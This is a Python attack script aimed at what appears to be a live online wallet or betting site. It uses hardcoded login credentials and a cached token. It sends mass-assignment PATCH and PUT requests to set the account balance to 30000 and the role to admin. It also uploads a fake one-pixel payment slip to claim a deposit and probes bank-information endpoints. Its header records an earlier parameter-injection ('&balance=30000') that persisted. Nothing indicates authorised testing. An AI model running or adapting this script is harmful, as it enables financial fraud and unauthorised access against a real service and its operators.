#!/usr/bin/env python3
"""probe_wallet_action.py — Full user profile + mass assignment PATCH on balance fields.

   FINDING: /mb/users returns full profile; line_id="0972571110&balance=30000"
   shows prior HPP stored in DB (PATCH user fields persists).
   New UUID: bank_currency_information_id=4a5dab48-21ab-4bc0-8d31-6d9c15ba2ee0

   Try:
   1. Full user profile dump
   2. PATCH /mb/users/{id} with balance/wallet fields (mass assignment)
   3. PATCH /mb/wallet with balance fields
   4. PUT /mb/wallet with overwritten balance
   5. Use bank_currency_information_id for fresh deposit
"""
import base64, json, pathlib, requests, time

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"
BANK_CURRENCY_ID = "4a5dab48-21ab-4bc0-8d31-6d9c15ba2ee0"  # NEW from /mb/users

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type":"application/json"},
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        timeout=15)
    if r.status_code in (200,201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth failed: {r.status_code}")

JWT = get_jwt()
USER_ID = "eea830ab-b187-4f21-9b79-28e2773b2f6b"
WALLET_ID = "456bc6aa-1b2b-4bd7-a0a1-6af319f6e40e"
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance","?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── 1. Full user profile dump ─────────────────────────────────────────────────
print("\n=== 1. Full user profile ===")
r = requests.get(f"{MGAPI}/mb/users", headers=HDR, timeout=10)
if r.ok:
    data = r.json()
    print(f"  Full: {json.dumps(data)[:2000]}")
    # Extract wallet/balance fields
    user = data.get("data", [{}])[0] if data.get("data") else {}
    print(f"\n  User keys: {list(user.keys())}")
    for k in ["balance", "credit", "wallet", "wallet_id", "payment_accounts", "bank_accounts"]:
        if k in user:
            print(f"  user.{k} = {json.dumps(user[k])[:200]}")
else:
    print(f"  HTTP {r.status_code}: {r.text[:200]}")

# ── 2. Mass assignment PATCH on user ─────────────────────────────────────────
print("\n=== 2. PATCH /mb/users/{id} mass assignment ===")
mass_assign_payloads = [
    {"balance": 30000},
    {"balance": 30000, "wallet_id": WALLET_ID},
    {"credit": 30000},
    {"wallet": {"balance": 30000}},
    {"wallet_balance": 30000},
    {"account_balance": 30000},
    {"main_balance": 30000},
    {"role": "admin", "balance": 30000},
]
for payload in mass_assign_payloads:
    r = requests.patch(f"{MGAPI}/mb/users/{USER_ID}",
                       headers=HDR, json=payload, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  [!!!] PATCH users {list(payload.keys())}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  PATCH users {list(payload.keys())}: {r.status_code}")
    time.sleep(0.5)

time.sleep(2)
print(f"  wallet after mass assign: {wallet()}")

# ── 3. PATCH /mb/wallet with balance ─────────────────────────────────────────
print("\n=== 3. PATCH/PUT /mb/wallet ===")
for method, data in [
    ("PATCH", {"balance": 30000}),
    ("PATCH", {"balance": 30000, "id": WALLET_ID}),
    ("PUT",   {"balance": 30000, "id": WALLET_ID, "user_id": USER_ID}),
    ("PATCH", {"credit": 30000}),
    ("PATCH", {"total_balance": 30000}),
]:
    fn = requests.patch if method == "PATCH" else requests.put
    r = fn(f"{MGAPI}/mb/wallet", headers=HDR, json=data, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  [!!!] {method} /mb/wallet {list(data.keys())}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  {method} /mb/wallet: {r.status_code}")

# PATCH wallet by ID
for method, data in [
    ("PATCH", {"balance": 30000}),
    ("PUT",   {"balance": 30000, "user_id": USER_ID}),
]:
    fn = requests.patch if method == "PATCH" else requests.put
    r = fn(f"{MGAPI}/mb/wallet/{WALLET_ID}", headers=HDR, json=data, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  [!!!] {method} /mb/wallet/{WALLET_ID[:8]}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  {method} /mb/wallet/{WALLET_ID[:8]}: {r.status_code}")

time.sleep(2)
print(f"  wallet after wallet PATCH: {wallet()}")

# ── 4. New deposit using BANK_CURRENCY_ID ─────────────────────────────────────
print("\n=== 4. Deposit with bank_currency_information_id ===")
# Get sign URL
sr = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                   json={"filename":"slip.png","content_type":"image/png","size":1024},
                   timeout=15)
slip_filename = ""
if sr.ok:
    slip_filename = sr.json().get("filename","")
    upload_url = sr.json().get("urlUpload","")
    if upload_url:
        minimal_png = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
            b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        requests.put(upload_url, headers={"Content-Type":"image/png"},
                     data=minimal_png, timeout=20)
    print(f"  sign-url: {sr.status_code}, filename={slip_filename[:30]}")

# Try deposit with new bank_currency_information_id
for bank_info_id in [BANK_INFO, BANK_CURRENCY_ID]:
    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json={"payment_bank_information_id": bank_info_id,
                            "deposit_amount": 1000,
                            "deposit_account_id": DEP_ACCT,
                            "slip_image_url": slip_filename or "slip.png",
                            "qr_string": ""},
                      timeout=15)
    if r.ok or r.status_code not in (404, 405):
        print(f"  [!!!] POST auto-slip-deposit bank_info={bank_info_id[:8]}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  POST auto-slip-deposit bank_info={bank_info_id[:8]}: {r.status_code}")

# ── 5. Check /mb/payment-bank-information ────────────────────────────────────
print("\n=== 5. Bank info endpoints ===")
for path in ["/mb/payment-bank-information", "/mb/bank-information",
             f"/mb/payment-bank-information/{BANK_CURRENCY_ID}",
             f"/mb/payment-bank-information/{BANK_INFO}"]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR, params={"domain":DOMAIN}, timeout=8)
    if r.status_code not in (404,):
        print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  GET {path}: 404")

time.sleep(2)
print(f"\nFINAL wallet: {wallet()}")
print("=== DONE ===")
